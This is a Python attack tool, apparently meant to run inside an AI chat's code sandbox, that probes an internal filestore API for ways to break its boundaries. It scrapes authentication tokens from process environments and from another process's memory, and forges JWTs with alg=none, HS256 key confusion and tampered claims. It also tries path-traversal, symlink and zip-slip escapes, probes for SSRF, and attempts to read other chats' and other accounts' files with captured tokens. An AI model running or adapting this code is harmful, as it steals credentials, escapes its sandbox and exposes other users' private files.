#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
mediafit.py v2.14.0
Boundary-break hunt on internal anthropic.filestore.v1alpha.Filestore
via api.anthropic.com (CORE asset).

NEW vs v2.13:
  - env fingerprint (gVisor vs Firecracker) + evidence
  - whole-fs grep for ANY claude_chat_* (foreign fsid discovery)
  - differential fsid error analysis (is the check token-bound or account-bound?)
  - signature-bypass battery: alg=none, HS256-confusion, kid tamper, JWKS probe
  - path-normalisation escape + server-side symlink escape
  - importZip zip-slip + importFiles SSRF probe
  - full raw body dump (no truncation)
  - CARRY-OVER block for cross-chat / cross-account matrix
"""
import os, sys, json, re, time, ssl, base64, hashlib, hmac, socket
import subprocess, traceback, zipfile, io
import urllib.request, urllib.error

VER      = "2.14.0"
REPORT   = "/mnt/user-data/outputs/mediafit-report.txt"
SINKS    = ["/mnt/user-data/outputs", "/tmp/mediafit", "/tmp", "/root/.mediafit"]
BASE     = "https://api.anthropic.com/v1/filestore/fs/"
CONF     = "/dev/shm/rclone-boot/config.json"
MOUNTS   = ["/mnt/user-data/outputs", "/mnt/user-data/uploads",
            "/mnt/user-data/tool_results", "/mnt/transcripts"]

# ===== CARRY-OVER SLOT (paste from a previous run / other account) =====
PREV_FSID           = ""   # e.g. "claude_chat_0186DZ9wXYxXcLmTegvEN2fT"
PREV_TOKEN          = ""   # e.g. "eyJhbGciOiJFUzI1NiIs..."
OTHER_ACCOUNT_TOKEN = ""   # token captured from a DIFFERENT anthropic account
OTHER_ACCOUNT_FSID  = ""
# =====================================================================

OUT, G = [], {}
def w(s=""): print(s, flush=True); OUT.append(str(s))
def head(t): w("\n" + "=" * 68 + "\n### " + t + "\n" + "=" * 68)
P, F, U, I = [], [], [], []
def rec(k, m, ev=None):
    w("    " + {"P":"[PASS]","F":"[FAIL]","U":"[UNKNOWN]","I":"[INFO]"}[k] + " " + m)
    if ev is not None: w("        evidence: " + str(ev)[:1200])
    {"P":P,"F":F,"U":U,"I":I}[k].append(m)
def sh(a, timeout=30):
    try:
        p = subprocess.run(a, capture_output=True, timeout=timeout)
        return p.returncode, p.stdout.decode("utf-8","replace"), p.stderr.decode("utf-8","replace")
    except Exception as e:
        return -1, "", "EXC:%s" % e
def b64d(x): return base64.urlsafe_b64decode(x + "=" * (-len(x) % 4))
def b64e(x):
    x = x if isinstance(x, bytes) else x.encode()
    return base64.urlsafe_b64encode(x).rstrip(b"=").decode()
def step(n, f):
    try: f()
    except Exception as e:
        w("    !! %s crashed: %s" % (n, e))
        w("    " + traceback.format_exc().strip().splitlines()[-1][:200])

_CTX = ssl.create_default_context(); _CTX.check_hostname = False; _CTX.verify_mode = ssl.CERT_NONE
def http(url, method="POST", token=None, body=None, timeout=12, hdrs=None, raw=False):
    h = {"User-Agent": "mediafit/" + VER}
    if token: h["Authorization"] = "Bearer " + token
    if body is not None: h["Content-Type"] = "application/json"
    if hdrs: h.update(hdrs)
    data = None
    if body is not None:
        data = body if isinstance(body, bytes) else json.dumps(body).encode()
    req = urllib.request.Request(url, method=method, headers=h, data=data)
    try:
        r = urllib.request.urlopen(req, timeout=timeout, context=_CTX)
        return r.status, r.read() if raw else r.read(200000)
    except urllib.error.HTTPError as e:
        try: b = e.read()
        except Exception: b = b""
        return e.code, b if raw else b[:200000]
    except Exception as e:
        return None, ("ERR:%s" % e).encode()
def api(method, payload, token=None, timeout=12):
    return http(BASE + method, "POST", token, payload, timeout,
                {"Connect-Protocol-Version": "1"})

# ------------------------------------------------------------------ 1
def s_env():
    head("1. ENVIRONMENT FINGERPRINT")
    for cmd in [["uname","-a"], ["cat","/proc/version"], ["cat","/proc/1/cmdline"]]:
        rc, o, e = sh(cmd)
        w("    $ %s -> %s" % (" ".join(cmd), (o or e).strip()[:220].replace("\x00"," ")))
    ev = {}
    for p in ["/sys/bus/virtio/devices", "/sys/firmware", "/dev"]:
        try: ev[p] = sorted(os.listdir(p))[:14]
        except Exception as ex: ev[p] = str(ex)
    w("    fs probes: %s" % json.dumps(ev)[:600])
    rc, o, _ = sh(["sh","-c","mount | grep -Ei 'virtiofs|9p|overlay|squashfs' | head -8"])
    w("    mounts: %s" % o.strip()[:400])
    rc, o, _ = sh(["sh","-c","ls -la /dev/vd* /dev/kvm 2>&1 | head -8"])
    w("    block devs: %s" % o.strip()[:300])
    kind = "gVisor" if "runsc" in (ev.get("/dev") or []) else "unknown"
    rc, o, _ = sh(["uname","-a"])
    if "runsc" in o: kind = "gVisor (runsc)"
    elif ev.get("/sys/bus/virtio/devices"): kind = "MicroVM (virtio present -> Firecracker-class)"
    G["KIND"] = kind
    rec("I", "sandbox kind = %s" % kind)

# ------------------------------------------------------------------ 2
def s_boot():
    head("2. CONFIG + TOKEN HARVEST + FSID DISCOVERY")
    try:
        conf = json.loads(open(CONF).read())
        for m in conf.get("mounts", []):
            if m.get("filesystem_id"): G["fsid"] = m["filesystem_id"]
        w("    service_url=%s fsid=%s" % (conf.get("service_url"), G.get("fsid")))
    except Exception as e:
        rec("U", "config unreadable: %s" % e)

    JWT = re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
    TK = []
    def addtok(t):
        t = t.decode() if isinstance(t, bytes) else t
        t = t.strip().strip('"').strip("'")
        if t.startswith("eyJ") and t not in TK: TK.append(t)
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            for m in JWT.findall(open("/proc/%s/environ" % p, "rb").read()): addtok(m)
        except Exception: pass
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            cl = open("/proc/%s/cmdline" % p, "rb").read()
            if b"rclone" not in cl: continue
        except Exception: continue
        try: maps = open("/proc/%s/maps" % p).read().splitlines()
        except Exception: continue
        try: mem = open("/proc/%s/mem" % p, "rb", buffering=0)
        except Exception: continue
        for line in maps:
            try: rng, perms = line.split()[0], line.split()[1]
            except Exception: continue
            if "r" not in perms: continue
            try:
                a, b = rng.split("-"); s0 = int(a,16); e0 = int(b,16)
            except Exception: continue
            if e0 - s0 <= 0 or e0 - s0 > 256*1024*1024: continue
            try: mem.seek(s0); d = mem.read(e0 - s0)
            except Exception: continue
            for m in JWT.findall(d): addtok(m)
    # bounded file sweep for tokens
    for root in ["/dev/shm", "/tmp", "/var/log", "/root", "/home", "/opt", "/etc"]:
        for dp, dn, fn in os.walk(root):
            if dp.count("/") > 7: dn[:] = []
            for f in fn[:60]:
                fp = os.path.join(dp, f)
                try:
                    if os.path.getsize(fp) > 3_000_000: continue
                    d = open(fp, "rb").read()
                except Exception: continue
                for m in JWT.findall(d): addtok(m)

    TD = []
    for t in TK:
        try:
            h, p, s = t.split("."); TD.append({"tok": t, "pl": json.loads(b64d(p)), "hdr": json.loads(b64d(h))})
        except Exception: pass
    G["TD"] = TD
    for r in TD:
        if "/outputs" in (r["pl"].get("allowed_roots") or []): G["TOKEN"] = r["tok"]; break
    if not G.get("TOKEN") and TD: G["TOKEN"] = TD[0]["tok"]
    G["ACCT"] = TD[0]["pl"].get("account_uuid") if TD else None
    w("    tokens=%d acct=%s" % (len(TD), G.get("ACCT")))
    for r in TD:
        w("        roots=%s ro=%s presented=%s" % (r["pl"].get("allowed_roots"),
                                                   r["pl"].get("readonly"),
                                                   r["pl"].get("claude_presented")))
    rec("P" if G.get("TOKEN") else "F", "token harvested n=%d" % len(TD))

    # --- foreign fsid discovery: grep entire fs for the id pattern ---
    PAT = re.compile(rb"claude_chat_[A-Za-z0-9]{18,30}")
    found = set()
    for root in ["/dev/shm", "/tmp", "/var/log", "/root", "/home", "/opt", "/etc",
                 "/mnt/user-data/outputs", "/mnt/user-data/uploads",
                 "/mnt/user-data/tool_results", "/mnt/transcripts"]:
        for dp, dn, fn in os.walk(root):
            if dp.count("/") > 8: dn[:] = []
            for f in fn[:80]:
                fp = os.path.join(dp, f)
                try:
                    if os.path.getsize(fp) > 4_000_000: continue
                    d = open(fp, "rb").read()
                except Exception: continue
                for m in PAT.findall(d): found.add(m.decode())
    G["FSIDS"] = sorted(found)
    w("    fsids discovered anywhere on fs: %s" % G["FSIDS"])
    for extra in [PREV_FSID, OTHER_ACCOUNT_FSID]:
        if extra and extra not in G["FSIDS"]: G["FSIDS"].append(extra)
    rec("P" if len(G["FSIDS"]) > 1 else "U", "fsid pool n=%d" % len(G["FSIDS"]))
    try:
        fs = sorted(os.listdir("/mnt/transcripts"))
        G["TRF"] = fs[0] if fs else None
        w("    sample /transcripts file: %s" % G["TRF"])
    except Exception: pass
    try:
        outs = sorted(os.listdir("/mnt/user-data/outputs"))
        G["OUTF"] = outs[-1] if outs else None
        w("    sample /outputs file: %s" % G["OUTF"])
    except Exception: pass

# ------------------------------------------------------------------ 3
def s_differ():
    head("3. DIFFERENTIAL FSID ERROR ANALYSIS (token-bound vs account-bound?)")
    T = G.get("TOKEN")
    if not T: rec("U", "no token"); return
    own = G.get("fsid")
    cases = [
        ("control (own fsid)",        own),
        ("random valid-format fsid",  "claude_chat_" + b64e(os.urandom(18))[:24]),
        ("bare ULID (no prefix)",     (own or "")[12:]),
        ("malformed",                 "zzz_not_an_fsid"),
        ("empty string",              ""),
        ("PREV_FSID",                 PREV_FSID or None),
    ]
    for label, f in cases:
        if f is None: continue
        st, b = api("listDirectory", {"filesystem_id": f, "path": "/outputs"}, T)
        w("    %-28s -> %s %s" % (label, st, b[:220].decode("utf-8","replace")))
    st, b = api("listDirectory", {"path": "/outputs"}, T)
    w("    %-28s -> %s %s" % ("no fsid field", st, b[:220].decode("utf-8","replace")))
    st, b = api("listDirectory", {"filesystem_id": own, "path": "/outputs"}, None)
    w("    %-28s -> %s %s" % ("no token", st, b[:200].decode("utf-8","replace")))
    rec("I", "compare the 6 messages above: identical text = existence check; "
             "'mismatch' wording = token binding")

# ------------------------------------------------------------------ 4
def s_jwks():
    head("4. PUBLIC KEY DISCOVERY (needed for HS256 confusion)")
    key = None
    for u in ["https://api.anthropic.com/.well-known/jwks.json",
              "https://api.anthropic.com/v1/.well-known/jwks.json",
              "https://api.anthropic.com/.well-known/openid-configuration",
              "https://api.anthropic.com/v1/oauth/jwks",
              "https://api.anthropic.com/jwks.json"]:
        st, b = http(u, "GET", None, None, 8)
        w("    GET %-58s -> %s %s" % (u, st, b[:180].decode("utf-8","replace")))
        if st == 200:
            try:
                j = json.loads(b)
                ks = j.get("keys") or []
                for k in ks:
                    if k.get("kty") == "EC" and k.get("crv") == "P-256" and k.get("x") and k.get("y"):
                        key = {"x": k["x"], "y": k["y"], "kid": k.get("kid")}
                        G["JWKS"] = key
                        rec("P", "JWKS EC P-256 key found", str(k)[:200]); break
            except Exception: pass
        if key: break
    if not key:
        for cand in ["/opt/rclone/rclone-filestore", "/opt/rclone"]:
            rc, o, _ = sh(["sh","-c","grep -a -o -m3 'BEGIN PUBLIC KEY' %s 2>/dev/null; "
                                   "strings -n 40 %s 2>/dev/null | grep -m3 -E '^MFkwEw|^MFkw' "
                                   % (cand, cand)])
            if o.strip(): w("    pem hints in %s: %s" % (cand, o.strip()[:200]))
    if not key: rec("U", "no JWKS; HS256 confusion untestable this run")

# ------------------------------------------------------------------ 5
def s_forge():
    head("5. SIGNATURE-BYPASS BATTERY")
    T = G.get("TOKEN")
    if not T: rec("U", "no token"); return
    h, p, s = T.split(".")
    hdr = json.loads(b64d(h)); pl = json.loads(b64d(p))
    own = G.get("fsid")
    def trytok(label, tok, fsid=None, path="/outputs"):
        st, b = api("listDirectory", {"filesystem_id": fsid or own, "path": path}, tok)
        w("    %-34s -> %s %s" % (label, st, b[:180].decode("utf-8","replace")))
        return st
    # 5a. does it verify at all? modify payload, keep signature
    p2 = dict(pl); p2["allowed_roots"] = ["/"]
    forged_same = b64e(hdr) + "." + b64e(json.dumps(p2)) + "." + s
    if trytok("keep-old-signature + roots=[/]", forged_same) == 200:
        rec("P", "SIGNATURE NOT VERIFIED -> full forgery possible")
    # 5b. alg=none
    hn = {"alg": "none", "typ": "JWT"}
    trytok("alg=none (empty sig)", b64e(hn) + "." + b64e(json.dumps(p2)) + ".")
    # 5c. HS256 confusion with public key as HMAC secret
    jk = G.get("JWKS")
    if jk:
        x = b64d(jk["x"]); y = b64d(jk["y"])
        spki_prefix = bytes.fromhex("3059301306072a8648ce3d020106082a8648ce3d030107034200")
        der = spki_prefix + b"\x04" + x + y
        pem = ("-----BEGIN PUBLIC KEY-----\n"
               + "\n".join(base64.encodebytes(der).decode().strip().split("\n"))
               + "\n-----END PUBLIC KEY-----\n")
        secrets = {
            "raw x||y": x + y,
            "uncompressed 04||x||y": b"\x04" + x + y,
            "DER SPKI": der,
            "PEM": pem.encode(),
            "kid": (hdr.get("kid") or "").encode(),
            "b64(x||y)": b64e(x + y).encode(),
        }
        hs_hdr = {"alg": "HS256", "typ": "JWT", "kid": hdr.get("kid")}
        for name, sec in secrets.items():
            sig = hmac.new(sec, (b64e(hs_hdr) + "." + b64e(json.dumps(p2))).encode(),
                           hashlib.sha256).digest()
            if trytok("HS256 confusion [%s]" % name,
                      b64e(hs_hdr) + "." + b64e(json.dumps(p2)) + "." + b64e(sig)) == 200:
                rec("P", "HS256 CONFUSION WORKS via %s" % name)
    else:
        rec("U", "skipped HS256 confusion (no JWKS key)")
    # 5d. kid tamper
    ht = dict(hdr); ht["kid"] = "x" * len(hdr.get("kid") or "x")
    trytok("kid tampered", b64e(ht) + "." + p + "." + s)
    # 5e. strip exp
    pe = {k: v for k, v in pl.items() if k != "exp"}
    trytok("exp removed + old sig", b64e(hdr) + "." + b64e(json.dumps(pe)) + "." + s)

# ------------------------------------------------------------------ 6
def s_methods():
    head("6. RPC SURFACE ENUMERATION")
    rc, o, _ = sh(["sh","-c","strings -n 6 /opt/rclone/rclone-filestore 2>/dev/null "
                           "| grep -oE '\"[a-z][A-Za-z]{4,30}\"' | sort -u | head -400"])
    greek = set()
    for m in re.findall(r"[A-Za-z]{5,32}", o):
        if m[0].islower() and any(c.isupper() for c in m): greek.add(m)
    CAND = sorted(greek) or []
    for m in ["listDirectory","readFile","writeFile","createFile","getFileMetadata","moveFile",
              "copyFile","removeFile","importFiles","importZip","listFiles","listFilesystems",
              "listFilesystem","getFilesystem","getFilesystemUsage","reassignFilesystem",
              "signC2PA","stat","listRoots","getRoots"]:
        if m not in CAND: CAND.append(m)
    T = G.get("TOKEN"); own = G.get("fsid"); live = []
    for m in CAND:
        st, b = api(m, {"filesystem_id": own, "path": "/outputs"}, T, 8)
        if st is not None and st != 404:
            live.append(m)
            w("    %-22s -> %s %s" % (m, st, b[:200].decode("utf-8","replace")))
    G["LIVE"] = live
    rec("P" if live else "F", "live methods: %s" % live)

# ------------------------------------------------------------------ 7
def s_raw():
    head("7. RAW FULL BODY (fix the empty {} from listDirectory)")
    T = G.get("TOKEN"); own = G.get("fsid")
    for path in ["/outputs", "/outputs/", "", "/", "/outputs/..", "/uploads", "/transcripts"]:
        st, b = api("listDirectory", {"filesystem_id": own, "path": path}, T)
        w("    path=%-16r -> %s len=%d\n        %s" % (path, st, len(b), b[:900].decode("utf-8","replace")))

# ------------------------------------------------------------------ 8
def s_escape():
    head("8. PATH-NORMALISATION + SERVER-SIDE SYMLINK ESCAPE")
    T = G.get("TOKEN"); own = G.get("fsid"); trf = G.get("TRF")
    if not trf: rec("U", "no /transcripts sample file"); return
    tests = ["/transcripts/" + trf, "//transcripts/" + trf,
             "/./transcripts/" + trf, "/outputs/../transcripts/" + trf,
             "/outputs//../transcripts/" + trf, "/outputs/./../transcripts/" + trf,
             "/outputs/../../transcripts/" + trf, "/transcripts//" + trf,
             "/outputs/../uploads/" + (G.get("OUTF") or trf)]
    for pth in tests:
        st, b = api("readFile", {"filesystem_id": own, "path": pth}, T)
        flag = "  <== ESCAPE!" if (st == 200 and not pth.startswith("/transcripts/")) else ""
        w("    %-46s -> %s%s" % (pth, st, flag))
        if st == 200 and flag: rec("P", "PATH ESCAPE: %s" % pth)
    # server-side symlink (writes through FUSE -> becomes server-side)
    for tgt, name in [("/transcripts", "__mf_tr"), ("/", "__mf_root"), ("/uploads", "__mf_up")]:
        lp = "/mnt/user-data/outputs/" + name
        try:
            if os.path.islink(lp) or os.path.exists(lp): os.remove(lp)
        except Exception: pass
        try:
            os.symlink(tgt, lp)
            w("    created symlink %s -> %s" % (name, tgt))
        except Exception as e:
            w("    symlink %s failed: %s" % (name, e)); continue
    time.sleep(2)
    for name, probe in [("__mf_tr", "/transcripts/" + trf), ("__mf_root", "transcripts/" + trf),
                        ("__mf_root", "outputs/" + (G.get("OUTF") or trf))]:
        pth = "/outputs/" + name + "/" + probe.split("/", 1)[1] if probe.startswith("transcripts") \
              else "/outputs/" + name + "/" + probe
        st, b = api("readFile", {"filesystem_id": own, "path": pth}, T)
        w("    symlink read %-44s -> %s" % (pth, st))
        if st == 200: rec("P", "SYMLINK ESCAPE: %s" % pth)

# ------------------------------------------------------------------ 9
def s_write():
    head("9. WRITE / IMPORT PROBES (zip-slip, SSRF, readonly enforcement)")
    T = G.get("TOKEN"); own = G.get("fsid")
    TRO = None
    for r in G.get("TD", []):
        if r["pl"].get("readonly") is True: TRO = r["tok"]; break
    st, b = api("writeFile", {"filesystem_id": own, "path": "/outputs/__mf_w.txt",
                              "content": b64e("mediafit")}, T)
    w("    writeFile(base64 content) -> %s %s" % (st, b[:160].decode("utf-8","replace")))
    if st not in (200, None): 
        st, b = api("writeFile", {"filesystem_id": own, "path": "/outputs/__mf_w.txt",
                                  "data": "mediafit"}, T)
        w("    writeFile(plain data)   -> %s %s" % (st, b[:160].decode("utf-8","replace")))
    if TRO:
        st, b = api("writeFile", {"filesystem_id": own, "path": "/outputs/__mf_ro.txt",
                                  "content": b64e("ro")}, TRO)
        w("    writeFile with READONLY token -> %s %s" % (st, b[:160].decode("utf-8","replace")))
    # zip-slip
    try:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("normal.txt", "normal")
            z.writestr("../__mf_slip.txt", "slip")
            z.writestr("/__mf_abs.txt", "abs")
        zb = buf.getvalue()
        st, b = api("importZip", {"filesystem_id": own, "path": "/outputs",
                                  "content": b64e(zb)}, T)
        w("    importZip(b64 content) -> %s %s" % (st, b[:200].decode("utf-8","replace")))
        if st in (400, None):
            st, b = api("importZip", {"filesystem_id": own, "path": "/outputs",
                                      "data": b64e(zb)}, T)
            w("    importZip(b64 data)    -> %s %s" % (st, b[:200].decode("utf-8","replace")))
    except Exception as e:
        w("    zip build failed: %s" % e)
    # SSRF probe
    for body in [{"filesystem_id": own, "path": "/outputs/__mf_imp.txt",
                  "url": "https://raw.githubusercontent.com/git/git/master/README.md"},
                 {"filesystem_id": own, "path": "/outputs/__mf_imp.txt",
                  "source": "https://example.com"}]:
        st, b = api("importFiles", body, T)
        w("    importFiles %s -> %s %s" % (list(body.keys())[-1], st,
                                           b[:200].decode("utf-8","replace")))
    # reassign (needs a foreign fsid)
    for f in [x for x in G.get("FSIDS", []) if x != own][:2]:
        st, b = api("reassignFilesystem", {"filesystem_id": f}, T)
        w("    reassignFilesystem(%s) -> %s %s" % (f[:34], st, b[:180].decode("utf-8","replace")))

# ------------------------------------------------------------------ 10
def s_matrix():
    head("10. CROSS-FS MATRIX (token x fsid) -- the F1 prover")
    own = G.get("fsid"); T = G.get("TOKEN")
    toks = {"own-chat": T}
    if PREV_TOKEN: toks["prev-chat"] = PREV_TOKEN
    if OTHER_ACCOUNT_TOKEN: toks["other-account"] = OTHER_ACCOUNT_TOKEN
    fsids = {"own": own}
    if PREV_FSID: fsids["prev"] = PREV_FSID
    if OTHER_ACCOUNT_FSID: fsids["other-acct"] = OTHER_ACCOUNT_FSID
    if len(fsids) == 1:
        for f in G.get("FSIDS", []):
            if f != own: fsids["discovered:" + f[-8:]] = f
    for tn, tk in toks.items():
        for fn, fv in fsids.items():
            st, b = api("listDirectory", {"filesystem_id": fv, "path": "/outputs"}, tk)
            mark = "  <== CROSS-FS READ" if (st == 200 and not (tn == "own-chat" and fn == "own")) else ""
            w("    token=%-14s fsid=%-18s -> %s%s" % (tn, fn, st, mark))
            if mark: rec("P", "CROSS-FS READ token=%s fsid=%s" % (tn, fn))
            if st == 200 and G.get("OUTF"):
                st2, _ = api("readFile", {"filesystem_id": fv, "path": "/outputs/" + G["OUTF"]}, tk)
                w("        readFile -> %s" % st2)
                if st2 == 200 and mark: rec("P", "CROSS-FS FILE CONTENT token=%s fsid=%s" % (tn, fn))

# ------------------------------------------------------------------ 11
def s_verdict():
    head("VERDICT")
    w("  kind=%s" % G.get("KIND"))
    w("  PASS  %d: %s" % (len(P), P))
    w("  FAIL  %d: %s" % (len(F), F))
    w("  UNK   %d: %s" % (len(U), U))
    w("  live methods: %s" % G.get("LIVE"))
    w("\n  ---------- CARRY-OVER (paste into the NEXT chat's v2.14 slot) ----------")
    w("PREV_FSID  = %r" % (G.get("fsid") or ""))
    w("PREV_TOKEN = %r" % (G.get("TOKEN") or ""))
    if G.get("ACCT"): w("ACCOUNT_UUID = %r" % G["ACCT"])
    w("  ------------------------------------------------------------------------")

def main():
    for n, f in [("env", s_env), ("boot", s_boot), ("differ", s_differ), ("jwks", s_jwks),
                 ("forge", s_forge), ("methods", s_methods), ("raw", s_raw),
                 ("escape", s_escape), ("write", s_write), ("matrix", s_matrix),
                 ("verdict", s_verdict)]:
        step(n, f)
try: main()
except Exception as e:
    w("!! main: %s" % e); w(traceback.format_exc())
finally:
    txt = "\n".join(OUT)
    for d in SINKS:
        try:
            os.makedirs(d, exist_ok=True)
            open(os.path.join(d, os.path.basename(REPORT)), "w").write(txt)
        except Exception: pass
    print("\nwritten: " + ", ".join(SINKS))